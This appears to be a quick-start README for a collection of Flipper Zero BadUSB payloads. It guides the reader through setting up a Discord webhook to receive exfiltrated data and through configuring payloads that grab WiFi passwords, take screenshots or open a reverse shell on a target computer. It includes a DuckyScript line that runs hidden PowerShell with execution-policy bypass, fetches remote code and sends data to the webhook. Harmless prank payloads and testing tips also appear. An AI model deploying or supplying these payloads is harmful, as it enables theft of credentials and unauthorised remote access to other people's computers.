# 🚀 Quick Start Guide

Get up and running with Flipper Zero BadUSB payloads in 5 minutes!

---

## 📋 Prerequisites

- Flipper Zero with BadUSB capability
- Target computer (Windows, Linux, macOS, or iOS)
- (Optional) Discord account for receiving exfiltrated data

---

## 🎯 Step 1: Set Up Discord Webhook

Most payloads send data to Discord. Here's how to set up a webhook:

1. **Create or open a Discord server**
2. **Go to Server Settings** → **Integrations** → **Webhooks**
3. **Click "New Webhook"**
4. **Copy the webhook URL** (looks like `https://discord.com/api/webhooks/123456/abcdef...`)

---

## 🎯 Step 2: Choose Your Payload

Navigate to the `payloads/` folder and pick one:

### Plug & Play (No Configuration Needed)
```
payloads/windows/fun/rickroll.txt       # Rick Roll
payloads/windows/fun/fake_bsod.txt      # Fake Blue Screen
payloads/linux/fun/rickroll.txt         # Linux Rick Roll
payloads/ios/pranks/rickroll.txt        # iOS Rick Roll
```

### Requires Configuration
```
payloads/windows/exfiltration/wifi_grabber.txt    # WiFi passwords → Discord
payloads/windows/exfiltration/screenshot.txt      # Screenshot → Discord
payloads/windows/execution/reverse_shell.txt      # Reverse shell
```

---

## 🎯 Step 3: Configure the Payload

Open your chosen `.txt` file and replace the placeholders:

### For Discord Payloads
```
YOUR_DISCORD_WEBHOOK → https://discord.com/api/webhooks/123456/abcdef
```

### For Reverse Shells
```
YOUR_IP → 192.168.1.100
YOUR_PORT → 4444
```

### Example: WiFi Grabber
**Before:**
```duckyscript
STRING powershell -w h -ep bypass "$env:DC='YOUR_DISCORD_WEBHOOK';$env:M='wifi';irm https://..."
```

**After:**
```duckyscript
STRING powershell -w h -ep bypass "$env:DC='https://discord.com/api/webhooks/123/abc';$env:M='wifi';irm https://..."
```

---

## 🎯 Step 4: Copy to Flipper Zero

### Method 1: qFlipper
1. Connect Flipper via USB
2. Open qFlipper
3. Navigate to `SD Card/badusb/`
4. Drag and drop your `.txt` file

### Method 2: Direct SD Access
1. Remove SD card from Flipper
2. Insert into computer
3. Copy `.txt` file to `badusb/` folder
4. Reinsert SD into Flipper

---

## 🎯 Step 5: Run the Payload

1. On Flipper: **Bad USB** → Select your payload
2. Connect Flipper to target computer
3. Press **Run** (center button)
4. Watch the magic happen!

---

## 🧪 Testing Tips

### Test Safely
- ✅ Use a **virtual machine** first
- ✅ Test on your **own devices**
- ✅ Take **snapshots** before running destructive payloads

### Common Issues

| Problem | Solution |
|---------|----------|
| PowerShell blocked | Target may have execution policy restrictions |
| UAC prompt appears | User needs to click "Yes" for admin payloads |
| Nothing happens | Increase DELAY values in payload |
| Wrong characters typed | Check keyboard layout (US QWERTY assumed) |

### Adjust Timing
If the payload types too fast, increase delays:
```duckyscript
DELAY 500    # Default
DELAY 1000   # Slower (for older computers)
DELAY 2000   # Very slow (for VMs)
```

---

## 📱 Platform-Specific Notes

### Windows
- Most payloads work out of the box
- Some require admin (will show UAC prompt)
- Defender may block some actions

### Linux
- Uses `CTRL ALT t` to open terminal
- Requires curl installed (usually is)
- May need sudo for some operations

### macOS
- Uses Spotlight (`GUI SPACE`) to open Terminal
- Security prompts may appear
- SIP may block some operations

### iOS
- Device **must be unlocked**
- Limited to app launching and typing
- No terminal access = no modular payloads

---

## 🎉 Your First Payload

Try this simple test payload to verify everything works:

### Windows Test
```duckyscript
REM Test Payload
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000
STRING Hello from Flipper Zero!
```

Save as `test.txt`, copy to Flipper, and run!

---

## 📚 Next Steps

1. **Explore more payloads** in the `payloads/` folder
2. **Read the documentation** for advanced usage
3. **Fork the repo** to customize for your needs
4. **Contribute** if you create something cool!

---

## 🆘 Need Help?

- Check the [README.md](README.md) for detailed info
- Look at payload comments for configuration hints
- Open an issue on GitHub

---

**Happy hacking! 🐬**
